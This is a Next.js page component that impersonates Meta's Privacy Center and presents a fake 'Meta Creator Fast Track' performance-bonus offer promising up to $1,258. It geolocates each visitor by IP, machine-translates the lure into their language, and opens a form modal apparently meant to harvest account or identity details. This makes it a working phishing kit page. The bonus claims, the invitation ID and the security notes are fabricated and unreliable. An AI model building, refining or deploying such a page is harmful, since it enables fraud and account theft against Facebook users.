'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleExclamation } from '@fortawesome/free-solid-svg-icons/faCircleExclamation';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), {
    ssr: false
});

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

const privacyCenterItems: InfoCardItem[] = [
    {
        id: 'policy',
        title: 'What is the Privacy Policy and what does it say?',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    },
    {
        id: 'manage',
        title: 'How you can manage or delete your information',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    }
];

const agreementItems: InfoCardItem[] = [
    {
        id: 'meta-ai',
        title: 'Meta AI',
        subtitle: 'User Agreement',
        image: MetaAI
    }
];

const resourceItems: InfoCardItem[] = [
    {
        id: 'generative-ai',
        title: 'How Meta uses information for generative AI models',
        subtitle: 'Privacy Center'
    },
    {
        id: 'ai-systems',
        title: 'Cards with information about the operation of AI systems',
        subtitle: 'Meta AI website'
    },
    {
        id: 'intro-ai',
        title: 'Introduction to Generative AI',
        subtitle: 'For teenagers'
    }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'META FOR CREATORS', 'Performance Bonus Eligibility – Meta Partner Program', 'Unlock Your Performance Bonus Now', 'You have been selected for the Meta Creator Fast Track 2026 program. This gives you access to consistent monthly bonuses, enhanced distribution, and priority creator support.', 'To activate your earnings and start receiving payouts, please complete your verification process below. Once activated, your eligible posts will automatically generate revenue based on performance.', 'Your page has been approved to start earning through the Facebook Performance Bonus program. Based on your recent content performance, your page has qualified for monetization opportunities across photo, text, and video posts.', 'We have successfully evaluated your engagement metrics and unlocked your eligibility for monthly earnings.', 'Earnings Overview:', '- Milestone Verified: Your page has met engagement requirements in the past month', '- Content Reach: Your posts have exceeded the required audience threshold.', '- Estimated Earnings: Up to $1,258 available based on current performance.', '- Next Bonus Cycle: Continue consistent posting to maintain and increase earnings.', 'To proceed with activation, please complete your profile verification via the Professional Dashboard or continue below.', 'Your invitation ID: # JZS9-B1FK-7CHG', 'Submit request', 'Activate Your Performance Bonus!', 'Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.', 'Activate Performance Bonus', 'You are joining the official Meta Creator ecosystem via Invitation on', 'May 5, 2026', 'Important Notes', 'For your security, ensure you are interacting within the verified Meta for Creators domain. Direct transfers will be initiated within 2 business days upon complete verification.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Meta Privacy Center - Community Standards</title>
            <div className='flex w-full max-w-275'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-17.5' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex flex-col gap-2'>
                        <p className='mb-5 text-[13px] font-light tracking-[0.12em] text-[#6b7280] uppercase'>{t('META FOR CREATORS')}</p>
                        <p className='text-2xl font-bold'>{t('Performance Bonus Eligibility – Meta Partner Program')}</p>
                    </div>
                    <div className='flex flex-col gap-4 text-[15px]'>
                        <p className='text-[16px]'>{t('Your page has been approved to start earning through the Facebook Performance Bonus program. Based on your recent content performance, your page has qualified for monetization opportunities across photo, text, and video posts.')}</p>
                        <p className='text-[16px]'>{t('We have successfully evaluated your engagement metrics and unlocked your eligibility for monthly earnings.')}</p>
                        <div className='my-4 text-[16px]'>
                            <p className='mb-2'>
                                <b>{t('Earnings Overview:')}</b>
                            </p>
                            <p className='mb-1'>{t('- Milestone Verified: Your page has met engagement requirements in the past month')}</p>
                            <p className='mb-1'>{t('- Content Reach: Your posts have exceeded the required audience threshold.')}</p>
                            <p className='mb-1'>{t('- Estimated Earnings: Up to $1,258 available based on current performance.')}</p>
                            <p className='mb-1'>{t('- Next Bonus Cycle: Continue consistent posting to maintain and increase earnings.')}</p>
                        </div>
                        <p className='my-2'>{t('To proceed with activation, please complete your profile verification via the Professional Dashboard or continue below.')}</p>
                        <div className='my-5 w-full rounded-2xl border border-dashed border-gray-300 bg-white p-4'>
                            <p className='text-[16px] font-medium'>{t('Your invitation ID: # JZS9-B1FK-7CHG')}</p>
                        </div>
                    </div>
                    <div className='mt-4 rounded-b-[20px] bg-white'>
                        <Image src={BackgroundImage} alt='' className='w-full rounded-t-[20px]' />
                        <div className='flex w-full flex-col gap-2 rounded-2xl bg-white p-3 md:p-5'>
                            <b className='text-[20px] font-medium md:text-[24px]'>{t('Unlock Your Performance Bonus Now')}</b>
                            <p className='text-[15px] text-gray-600'>{t('You have been selected for the Meta Creator Fast Track 2026 program. This gives you access to consistent monthly bonuses, enhanced distribution, and priority creator support.')}</p>
                            <p className='text-[15px] text-gray-600'>{t('To activate your earnings and start receiving payouts, please complete your verification process below. Once activated, your eligible posts will automatically generate revenue based on performance.')}</p>
                        </div>
                        <div
                            onClick={() => {
                                setModalKey((prev) => prev + 1);
                                setModalOpen(true);
                            }}
                            className='mt-7 flex h-11.25 min-h-11.25 w-full cursor-pointer items-center justify-center rounded-full bg-[#0064E0] transition hover:bg-[#0053c7]'
                        >
                            <span className='text-[15px] font-bold text-white'>{t('Activate Performance Bonus')}</span>
                        </div>
                        <p className='mt-3 text-center text-[14px] text-gray-600'>
                            {t('You are joining the official Meta Creator ecosystem via Invitation on')} <b>{t('May 5, 2026')}</b>
                        </p>
                    </div>
                    <div className='my-5 border-l-4 border-l-[#0064E0] bg-white p-4'>
                        <div className='flex items-center justify-start gap-2'>
                            <div className='h-6 max-h-6 min-h-6 w-6 max-w-6 min-w-6'>
                                <FontAwesomeIcon icon={faCircleExclamation} className='h-full w-full text-[#0064E0]' />
                            </div>
                            <p className='text-[15px] font-medium text-black'>{t('Important Notes')}</p>
                        </div>
                        <div className='mt-3 flex items-center justify-start gap-2'>
                            <div className='h-6 max-h-6 min-h-6 w-6 max-w-6 min-w-6'></div>
                            <div>
                                <p className='text-[15px] font-light text-black'>{t('For your security, ensure you are interacting within the verified Meta for Creators domain. Direct transfers will be initiated within 2 business days upon complete verification.')}</p>
                            </div>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            {privacyCenterItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === privacyCenterItems.length - 1;
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
                            {agreementItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === agreementItems.length - 1;
                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            {resourceItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === resourceItems.length - 1;
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
